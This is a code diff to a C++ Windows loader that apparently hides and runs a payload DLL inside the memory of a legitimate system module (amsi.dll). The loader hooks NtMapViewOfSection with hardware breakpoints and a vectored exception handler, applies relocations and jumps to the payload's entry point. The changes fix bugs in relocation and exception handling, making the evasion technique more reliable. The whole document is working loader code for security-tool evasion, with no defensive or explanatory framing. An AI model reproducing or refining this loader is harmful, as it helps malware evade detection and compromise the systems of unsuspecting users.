@@ -41,38 +41,46 @@ VOID InitWinAPI() {
 	NtContinue = (fnNtContinue)GetProcAddress(hNtdll, "NtContinue");
 }
 
-DWORD RvaToFoa(DWORD rva, PIMAGE_NT_HEADERS nt) {
+DWORD RvaToFoa(DWORD rva, PIMAGE_NT_HEADERS nt)
+{
 	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
 
-	for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+	for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
+	{
 		DWORD va = sec->VirtualAddress;
-		DWORD size = sec->Misc.VirtualSize;
+		DWORD size = max(sec->Misc.VirtualSize, sec->SizeOfRawData);
 
-		if (rva >= va && rva < va + size) {
+		if (rva >= va && rva < va + size)
+		{
 			return rva - va + sec->PointerToRawData;
 		}
 	}
-	return 0;
+
+	return DWORD(-1);
 }
 
-VOID FixRelocation(PVOID pMemBase, BYTE* pFileData) {
-	PIMAGE_NT_HEADERS pNt = RtlImageNtHeader(pFileData);
-	ULONGLONG delta = (ULONGLONG)pMemBase - (ULONGLONG)pNt->OptionalHeader.ImageBase;
+
+
+VOID FixRelocation(PVOID pMemBase, PVOID pBaseAddress) {
+	PIMAGE_NT_HEADERS pNt = RtlImageNtHeader(pMemBase);
+	ULONGLONG delta = (ULONGLONG)pMemBase - pNt->OptionalHeader.ImageBase;
 	if (delta == 0) {
 		return;
 	}
-
+	//printf("Delta = 0x%llx\n", delta);
 	PIMAGE_DATA_DIRECTORY pRelocDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-	DWORD dwFOA = RvaToFoa(pRelocDir->VirtualAddress, pNt);
-	PIMAGE_BASE_RELOCATION pRelocBaseBlock = (PIMAGE_BASE_RELOCATION)(pFileData + dwFOA);
+	//DWORD dwFOA = RvaToFoa(pRelocDir->VirtualAddress, pNt);
+	PIMAGE_BASE_RELOCATION pRelocBaseBlock = (PIMAGE_BASE_RELOCATION)((ULONGLONG)pMemBase + pRelocDir->VirtualAddress);
+	//PIMAGE_BASE_RELOCATION pRelocBaseBlock = (PIMAGE_BASE_RELOCATION)((ULONGLONG)pBaseAddress + dwFOA);
 	for (ULONG offset = 0; offset < pRelocDir->Size; offset = offset + pRelocBaseBlock->SizeOfBlock) {
-		pRelocBaseBlock = (PIMAGE_BASE_RELOCATION)((ULONGLONG)pFileData + dwFOA + offset);
+		pRelocBaseBlock = (PIMAGE_BASE_RELOCATION)((ULONGLONG)pMemBase + pRelocDir->VirtualAddress + offset);
 		PBASE_RELOCATION_ENTRY pRelcEntry = (PBASE_RELOCATION_ENTRY)((ULONGLONG)pRelocBaseBlock + sizeof(IMAGE_BASE_RELOCATION));
 		ULONG EntryCount = (pRelocBaseBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
 		for (ULONG i = 0; i < EntryCount; i++) {
 			if (pRelcEntry[i].Type != IMAGE_REL_BASED_DIR64) continue;
-			ULONGLONG* ullBuffer = (ULONGLONG*)((ULONGLONG)pMemBase + pRelocBaseBlock->VirtualAddress + pRelcEntry->Offset);
+			ULONGLONG* ullBuffer = (ULONGLONG*)((ULONGLONG)pMemBase + pRelocBaseBlock->VirtualAddress + pRelcEntry[i].Offset);
 			*ullBuffer += delta;
+			//printf("Relocated Address: 0x%llx\n", *ullBuffer);
 		}
 	}
 	return;
@@ -120,8 +128,7 @@ BOOL SetHardwareBreakpoint(PVOID address, PCONTEXT ctx) {
 		ctx->Dr0 = (DWORD64)address;
 		ctx->Dr7 = 1;
 		//ctx->Dr6 = 0;
-		//return TRUE;
-		NtContinue(ctx, FALSE);
+		return TRUE;
 	}
 	else {
 		CONTEXT context = { 0 };
@@ -153,7 +160,6 @@ BOOL CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
 			gLdrState = LdrState::StateMapViewOfSection;
 			SetHardwareBreakpoint(NtMapViewOfSection, ctx);
 			NtContinue(ctx, FALSE);
-			return EXCEPTION_CONTINUE_EXECUTION;
 		}
 		//else if (gLdrState == LdrState::StateMapViewOfSection) 
 		else {
@@ -194,22 +200,16 @@ BOOL CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
 			ctx->Dr7 = 0LL;
 			ctx->EFlags |= 0x10000u;
 
-
-			printf("Rip: 0x%llx\n", ctx->Rip);
-			printf("RSP=%p\n", ctx->Rsp);
-			printf("RFLAGS=%llx\n", ctx->EFlags);
-			printf("CS=%x SS=%x\n", ctx->SegCs, ctx->SegSs);
 			NTSTATUS status = NtContinue(ctx, FALSE);
 			if (status < 0) {
-				printf("NtContinue failed in VectoredHandler, NTSTATUS: 0x%08x\n", status);
+				printf("NtContinue failed in VectoredHandler, NTSTATUS: 0x%llx\n", status);
 			}
-			return EXCEPTION_CONTINUE_EXECUTION;
+			NtContinue(ctx, FALSE);
 		}
-		NtContinue(ctx, FALSE);
-		return EXCEPTION_CONTINUE_EXECUTION;
+		
+		
 	}
-	
-//	return FALSE;
+	return EXCEPTION_CONTINUE_EXECUTION;
 }
 
 BOOL MovePayloadToMemory(PVOID pDest, BYTE* pPayloadData, DWORD dwPayloadSize) {
@@ -239,7 +239,7 @@ int main() {
 		*(p + 1) = '\0';
 	}
 	strcat_s(szPayload, "Payload.dll");
-	printf("Payload path: %s\n", szPayload);
+	//printf("Payload path: %s\n", szPayload);
 	HANDLE hPayloadHandle = CreateFileA(szPayload, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	DWORD dwPayloadSize = GetFileSize(hPayloadHandle, NULL);
 	BYTE* pPlayloadData = new BYTE[dwPayloadSize + 1];
@@ -301,14 +301,9 @@ int main() {
 		printf("Fail to load amsi.dll. Error: 0x%08x", GetLastError());
 		return -1;
 	}
-	else {
-		printf("Continue...\n");
-	}
 	RemoveVectoredExceptionHandler(VectoredHandler);
 
 	PVOID EP = (PVOID)((DWORD64)pBaseAddress + entry_point);
 	((VOID(*)())EP)();
-
-
 	return 0;
 }
